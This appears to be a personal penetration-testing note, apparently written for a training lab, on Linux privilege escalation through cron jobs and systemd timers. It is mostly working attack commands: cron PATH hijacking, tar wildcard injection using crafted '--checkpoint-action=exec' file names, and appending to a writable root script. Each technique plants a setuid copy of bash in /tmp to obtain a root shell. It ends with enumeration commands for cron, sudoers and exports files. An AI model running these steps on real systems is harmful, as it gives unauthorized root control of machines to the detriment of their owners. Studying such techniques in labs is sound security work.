---
title: Cron / systemd
updated: 2023-10-31 04:40:17Z
created: 2023-10-14 13:36:35Z
latitude: -33.86881970
longitude: 151.20929550
altitude: 0.0000
---

### Cron (Path)
1. In command prompt type: `cat /etc/crontab`
2. From the output, notice the value of the “**PATH**” variable.
eg, the file overwrite.sh is running as root, and the PATH contains path **/home/user/**

3. In command prompt type:
`echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/<user>/overwrite.sh`
4. `chmod +x /home/<user>/overwrite.sh`
5. Wait for the Bash script to execute.
6. In command prompt type: `/tmp/bash -p`

### Cron (wildcards)

1. In command prompt type: `cat /etc/crontab`
2. From the output, notice the script “/usr/local/bin/compress.sh”
3. In command prompt type: cat /usr/local/bin/compress.sh
4. From the output, notice the wildcard (*) used by ‘tar’.

**Exploitation**
1. `echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh`
2. `touch /home/user/--checkpoint=1`
3. `touch /home/user/--checkpoint-action=exec=sh\ runme.sh`
4. Wait 1 minute for the Bash script to execute.
5. In command prompt type: `/tmp/bash -p`

### Cron (overwrite)
1. In command prompt type: `cat /etc/crontab`
2. From the output, notice the script “overwrite.sh”
3. In command prompt type: ls -l /usr/local/bin/overwrite.sh
4. From the output, notice the file permissions.

**Exploitation**
1. `echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh`
2. Wait 1 minute for the Bash script to execute.
3. In command prompt type: `/tmp/bash -p`


## Other CRON files to look at:
/etc/init.d
/etc/cron*
/etc/crontab
/etc/cron.allow
/etc/cron.d 
/etc/cron.deny
/etc/cron.daily
/etc/cron.hourly
/etc/cron.monthly
/etc/cron.weekly
/etc/sudoers
/etc/exports
/etc/anacrontab
/var/spool/cron
/var/spool/cron/crontabs/root

crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny*

***
# SYSTEMD Timers
`systemctl list-timers --all`